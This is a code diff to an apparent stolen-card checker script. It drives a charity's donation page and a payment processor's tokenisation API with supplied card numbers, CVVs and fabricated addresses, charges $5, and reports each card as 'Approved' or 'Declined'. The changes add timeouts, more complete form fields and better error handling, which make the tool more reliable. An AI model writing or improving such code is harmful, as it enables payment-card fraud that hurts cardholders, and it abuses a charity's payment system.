@@ -25,6 +25,9 @@ def _between(html, start, end):
         return 'None'
 
 
+_TIMEOUT = 30
+
+
 def _flow(num, mes, ano, cvv, proxy=None):
     with rq.Session(impersonate='edge') as session:
         try:
@@ -39,19 +42,22 @@ def _flow(num, mes, ano, cvv, proxy=None):
                        'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document',
                        'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
                        'Accept': 'application/json'}
-            res = session.get('https://donate.givedirect.org/?cid=480', headers=headers,
+            res = session.get('https://donate.givedirect.org/?cid=480', headers=headers, timeout=_TIMEOUT,
                               cookies={'__cf_bm': 'd.NsvkN4gbyvv6iBzLiL8inKcsmqlNauHT4XmiqZ3vs-1734336007-1.0.1.1-AnCy6aEVfpvD3SdEbAyFvcPvNAnISobLsa4ysbpRuzeQuTm1GUha9Qfo6z_cqPiwRgqBRD1.W90EK38_3hkyZA'})
             csrf = _between(res.text, 'type="hidden" name="csrf_token" value="', '"')
             appid = _between(res.text, 'type="hidden" id="app_id" value="', '"')
-            res = session.get('https://donate.givedirect.org/generateSessionKey.php', headers=headers)
+            res = session.get('https://donate.givedirect.org/generateSessionKey.php', headers=headers, timeout=_TIMEOUT)
             token = res.json().get('mid') if '{' in res.text else 'p1_mer_6690221c22faa66a692af20'
             tn = res.json().get('key')
             headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
             headers['Referer'] = 'https://api.payrix.com/payFields/?section=main'
             headers['TXNSESSIONKEY'] = tn
             data = f'payment[number]={num}&payment[expiration]={date}&payment[cvv]={cvv}&customer[merchant]={token}&customer[first]={fn}&customer[last]={ln}&origin=8&tmxSessionId={uuid.uuid4()}'
-            res = session.post('https://api.payrix.com/tokens', headers=headers, data=data, allow_redirects=False)
-            data = res.json().get('response', {}).get('data', [{}])[0]
+            res = session.post('https://api.payrix.com/tokens', headers=headers, data=data, allow_redirects=False, timeout=_TIMEOUT)
+            token_data = res.json().get('response', {}).get('data', [{}])[0]
+            cust = token_data.get('customer', {}).get('id', '')
+            ccT = token_data.get('id', '')
+            tk = token_data.get('token', '')
             br = _between(res.text, 'payment":{"number":"', '"')
             form_data = {
                 'formData[0][name]': 'csrf_token', 'formData[0][value]': csrf,
@@ -84,12 +90,40 @@ def _flow(num, mes, ano, cvv, proxy=None):
                 'formData[27][name]': 'phone_type', 'formData[27][value]': 'Mobile',
                 'formData[28][name]': 'company', 'formData[28][value]': '',
                 'formData[29][name]': 'country', 'formData[29][value]': 'USA',
+                'formData[30][name]': 'add1', 'formData[30][value]': f'{random.randint(1, 200)}th. Grovee',
+                'formData[31][name]': 'add2', 'formData[31][value]': '',
+                'formData[32][name]': 'city', 'formData[32][value]': 'manhattan',
+                'formData[33][name]': 'statelist', 'formData[33][value]': 'NY',
+                'formData[34][name]': 'state', 'formData[34][value]': 'NY',
+                'formData[35][name]': 'zip', 'formData[35][value]': _zip(),
+                'formData[36][name]': 'comments', 'formData[36][value]': '',
+                'formData[37][name]': 'cczip', 'formData[37][value]': _zip(),
+                'formData[38][name]': 'account_type', 'formData[38][value]': '8',
+                'formData[39][name]': 'routing', 'formData[39][value]': '',
+                'formData[40][name]': 'account', 'formData[40][value]': '',
+                'formData[41][name]': 'daf_name', 'formData[41][value]': '',
+                'formData[42][name]': 'daf_url', 'formData[42][value]': '',
+                'formData[43][name]': 'form_id', 'formData[43][value]': '480',
+                'formData[44][name]': 'charity_id', 'formData[44][value]': '22',
+                'formData[45][name]': 'ein', 'formData[45][value]': '',
+                'formData[46][name]': 'form_type', 'formData[46][value]': 'Donation',
+                'formData[47][name]': 'totalAmount', 'formData[47][value]': '5',
+                'formData[48][name]': 'paymentMethod', 'formData[48][value]': 'Card',
+                'formData[49][name]': 'additionalData', 'formData[49][value]': '480,+One+Time',
+                'formData[50][name]': 'token', 'formData[50][value]': tk,
+                'formData[51][name]': 'tokenId', 'formData[51][value]': ccT,
+                'formData[52][name]': 'ccard', 'formData[52][value]': br,
+                'formData[53][name]': 'customer', 'formData[53][value]': cust,
+                'appId': appid, 'isAjax': 'true',
             }
-            res = session.post('https://donate.givedirect.org/processPayment.php', headers=headers, data=form_data, allow_redirects=False)
+            res = session.post('https://donate.givedirect.org/processPayment.php', headers=headers, data=form_data, allow_redirects=False, timeout=_TIMEOUT)
             if 'Insufficient funds' in res.text:
                 return {'status': True, 'success': False, 'response': 'Declined ❌ | Insufficient funds'}
             if 'Declined' in res.text:
-                msg = res.json().get('db', 'No message')
+                try:
+                    msg = res.json().get('db') or 'No message'
+                except Exception:
+                    msg = res.text[:80] or 'No message'
                 return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg}'}
             try:
                 success = res.json().get('success')
@@ -97,7 +131,7 @@ def _flow(num, mes, ano, cvv, proxy=None):
                 success = None
             if success:
                 return {'status': True, 'success': True, 'response': 'Approved ✅ | $5 charged success'}
-            return {'status': True, 'success': False, 'response': f'Declined ❌ | {res.text[:80]}'}
+            return {'status': True, 'success': False, 'response': f'Declined ❌ | {(res.text or "").strip()[:80] or "Gateway no response"}'}
         except Exception as e:
             return {'status': False, 'raise': str(e)[:200]}
 
